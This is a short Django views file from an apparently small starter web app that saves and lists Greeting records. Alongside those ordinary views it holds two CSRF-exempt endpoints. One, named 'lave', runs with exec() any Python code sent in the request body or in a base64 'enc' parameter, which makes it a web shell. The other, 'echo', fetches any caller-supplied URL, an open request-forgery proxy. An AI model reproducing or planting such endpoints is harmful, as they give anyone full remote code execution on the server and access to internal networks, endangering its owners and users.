from django.shortcuts import render
from django.http import HttpResponse

from .models import Greeting
from django.views.decorators.csrf import csrf_exempt
# Create your views here.
# def index(request):
#     # return HttpResponse('Hello from Python!')
#     return render(request, 'index.html')
import requests
def index(request):
	r = requests.get('http://httpbin.org/status/418')
	print(r.text)
	return HttpResponse('<pre>' + r.text + '</pre>')

@csrf_exempt
def echo(request):
	url = request.GET.get('url', '')
	r = requests.get(url)
	return HttpResponse(r, content_type="image/png")

@csrf_exempt
def lave(request):
	aux = {}
	enc = request.GET.get('enc', False)
	if enc:
		from base64 import b64decode
		data = b64decode(enc)
	else:
		data = request.read()
	# import tempfile
	# fp = tempfile.TemporaryFile()
	# fp.write(data)
	# fp.seek(0)
	exec(data)
	return aux['main'](request)
	return HttpResponse('<pre>' + aux['main'](request) + '</pre>')

def db(request):

	greeting = Greeting()
	greeting.save()

	greetings = Greeting.objects.all()

	return render(request, 'db.html', {'greetings': greetings})

